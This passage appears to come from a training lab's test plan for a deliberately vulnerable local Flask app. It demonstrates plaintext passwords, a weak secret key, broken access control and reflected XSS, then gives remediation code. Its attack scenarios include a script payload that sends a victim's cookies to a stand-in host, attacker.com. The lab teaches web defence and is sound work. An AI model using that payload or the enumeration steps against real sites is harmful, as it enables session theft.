SECTION 2: WEAK AUTHENTICATION TESTING
============================================================================

TEST CASE 2.1: Plaintext Password Storage
------------------------------------------
Objective: Demonstrate plaintext password storage vulnerability

Steps:
1. Open app.py in a text editor
2. Search for the USERS dictionary
3. Observe passwords stored in plaintext

Example:
    USERS = {
        'admin': 'admin123',    <-- PLAINTEXT PASSWORD
        'user': 'password'      <-- PLAINTEXT PASSWORD
    }

Expected Result:
✓ Both passwords are visible in plaintext

Vulnerability Demonstrated:
- OWASP A02:2021 - Cryptographic Failures
- Passwords are not hashed or salted
- If database is compromised, all passwords are exposed
- Industry standard: Use bcrypt, argon2, or scrypt for password hashing


TEST CASE 2.2: Weak Secret Key
-------------------------------
Objective: Demonstrate weak session secret key

Steps:
1. Open app.py in a text editor
2. Search for app.secret_key
3. Observe weak key value

Example:
    app.secret_key = 'weak_secret_key_for_lab'

Expected Result:
✓ Secret key is a simple string, easy to guess

Vulnerability Demonstrated:
- OWASP A05:2021 - Security Misconfiguration
- Session tokens can be forged
- Attacker can create valid session tokens without authentication
- Industry standard: Use cryptographically secure random keys


TEST CASE 2.3: Session Cookie Inspection
-----------------------------------------
Objective: Examine session token structure

Steps:
1. Login with valid credentials (admin / admin123)
2. Open browser Developer Tools (F12 or Right-click → Inspect)
3. Go to "Application" or "Storage" tab
4. Look for "Cookies" section
5. Find cookie named "session"
6. Observe the cookie value

Expected Result:
✓ Session cookie is visible and readable
✓ Cookie value is a JWT or similar token
✓ Cookie doesn't have HttpOnly flag (in development mode)

Vulnerability Demonstrated:
- Session tokens are accessible to JavaScript
- Vulnerable to XSS attacks
- Industry standard: Use HttpOnly and Secure flags on cookies

TEST CASE 3.3: View Other Users' Profiles (Broken Access Control)
------------------------------------------------------------------
Objective: Demonstrate unauthorized profile access (CRITICAL VULNERABILITY)

Steps:
1. Login as 'user' account (username: user, password: password)
2. Navigate to: http://127.0.0.1:5000/profile?id=1

✓ See admin's email, username, and role
✗ NO authorization check performed

3. Navigate to: http://127.0.0.1:5000/profile?id=2

4. Navigate to: http://127.0.0.1:5000/profile?id=3
   Result: Can view guest profile

Vulnerability Demonstrated:
- OWASP A01:2021 - Broken Access Control (MOST CRITICAL)
- No authorization checks on profile page
- Any logged-in user can view any user's profile
- User ID is sequential and predictable
- Attacker can enumerate all users by trying different IDs

Steps:
1. Login with valid credentials (admin / admin123)
2. Navigate to: http://127.0.0.1:5000/search
3. In the search box, enter: <script>alert('XSS')</script>

Expected Result:

✗ Input is not sanitized or escaped
✗ Script executes in browser context

Vulnerability Demonstrated:
- OWASP A03:2021 - Injection (XSS)
- Reflected XSS - user input directly reflected in response
- No HTML escaping or sanitization
- Attacker can inject malicious scripts
- Scripts run with user's privileges

============================================================================
PRACTICAL ATTACK SCENARIOS
============================================================================

SCENARIO 1: Account Enumeration
================================
Objective: Discover all user IDs

Steps:
1. Login as any user
2. Visit /profile?id=1, /profile?id=2, /profile?id=3, etc.
3. Document which IDs return valid users

Result: Can enumerate all system users


SCENARIO 2: Session Hijacking
==============================
Objective: Steal another user's session

Steps:
1. Use Browser DevTools to capture your own session cookie
2. Note the session cookie value
3. Attempt to forge a similar cookie for different user
4. OR use cookie during vulnerable XSS to steal another user's session

Result: Can potentially hijack user sessions


SCENARIO 3: XSS Attack Chain
=============================
Objective: Perform combined XSS attack

Steps:
1. Create malicious search URL:
   http://127.0.0.1:5000/search?q=<script>
   var img=new Image();
   img.src='http://attacker.com/log.php?user='+document.cookie;
   </script>
2. Send URL to victim
3. When victim clicks, session is stolen

Result: Session hijacking through XSS

REMEDIATION RECOMMENDATIONS
============================================================================

Fix #1: Implement Password Hashing
-----------------------------------
USE: bcrypt, argon2, or scrypt
BEFORE: USERS = {'admin': 'admin123'}
AFTER:  USERS = {'admin': bcrypt.hashpw(b'admin123', salt)}

Code Example:
    import bcrypt
    hashed = bcrypt.hashpw(b'password', bcrypt.gensalt())
    if bcrypt.checkpw(b'password', hashed):
        # Password matches


Fix #2: Implement Strong Secret Key
------------------------------------
BEFORE: app.secret_key = 'weak_secret_key_for_lab'
AFTER:  app.secret_key = secrets.token_hex(32)

Code Example:
    import secrets
    app.secret_key = secrets.token_hex(32)


Fix #3: Add HTML Escaping
--------------------------
BEFORE: {{ result | safe }}
AFTER:  {{ result | escape }}

Code Example:
    from markupsafe import escape
    result = escape(user_input)


Fix #4: Implement Authorization Checks
---------------------------------------
BEFORE: 
    if user_id in USER_DATA:
        return render_user(user_id)

AFTER:
    current_user_id = get_user_id_from_session()
    if user_id != current_user_id:
        return "Unauthorized", 403
    if user_id in USER_DATA:
        return render_user(user_id)


Fix #5: Implement Account Lockout
----------------------------------
Add lockout after N failed attempts:
    failed_attempts[username] += 1
    if failed_attempts[username] > 5:
        # Lockout user for 15 minutes


Fix #6: Implement Input Validation
-----------------------------------
Use Flask-WTF for CSRF and input validation:
    from flask_wtf.csrf import CSRFProtect
    csrf = CSRFProtect(app)
